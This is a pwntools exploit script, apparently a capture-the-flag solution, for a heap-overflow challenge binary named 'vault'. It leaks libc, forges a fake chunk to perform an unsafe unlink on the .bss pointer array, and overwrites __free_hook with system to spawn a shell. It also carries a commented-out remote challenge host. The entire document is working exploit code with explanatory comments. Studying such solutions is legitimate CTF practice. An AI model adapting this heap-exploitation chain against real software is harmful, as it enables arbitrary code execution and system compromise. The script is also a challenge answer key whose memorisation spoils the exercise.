from pwn import *
elf = context.binary = ELF("./vault")

context.log_level = "debug"
libc = ELF("./libc.so.6")

def malloc(index):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"?",str(index))



def free(index):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"?",str(index))

#malloc only 2 times(biggest restriction on binary)
#only unsorted bins 
#no UAF vuln exploit to merging of unsorted bin chunks into top chunks
#heap overflow vuln

#libc has no tcache


io = process()
# io = remote("play.scriptsorcerers.xyz" ,10229)
gdb.attach(io)
io.recvuntil(b"is ")
leak = io.recvline()[:-1]

libc.address = int(leak,0x10)-libc.sym.puts#libc leak given in problem
#fake chunk ->vault(where heap pointers are stored.)
#main aim is to get arb write

#making fake chunk to bypass safe linking and getting a writable address on .bss section.
fd  = elf.sym.vaults-24#bk will point to vault
bk = elf.sym.vaults-0x10#overlap with fake chunks fd

prev_size = 0x80
fake_size=  0x90    
#malloc points to meta data not user data 
#also this libc checks the prev size field
payload = pack(0x0)+pack(0x80)+pack(fd)+pack(bk)+pack(0x0)*12+pack(prev_size)+pack(fake_size)

malloc(0x0)#malloc 1st chunks
malloc(0x1)#malloc 2nd chunk

io.sendlineafter(b">",b"2")
io.sendline(b"0")

io.recvuntil(b"?")
# print(len(payload))
io.sendline(payload)


free(0x1)
#vault points to (&vault-24) which is also index 1
array_payload = pack(0x0)*0x1+pack(libc.address+0x3b55a0)+pack(0x0)+pack(libc.sym.__free_hook-0x8)
io.sendlineafter(b">",b"2")
io.sendline(b"0")
#this payload points 1st index to 8 bytes behind free hook
io.recvuntil(b"?")
io.sendline(array_payload)


#bin sh on free_hoook-8 and system on free_hook
exit_payload = b"/bin/sh\x00"+pack(libc.sym.system)
io.sendlineafter(b">",b"2")
io.sendline(b"0")

io.recvuntil(b"?")
io.sendline(exit_payload)
free(0x0)#freeing index 1st
io.interactive()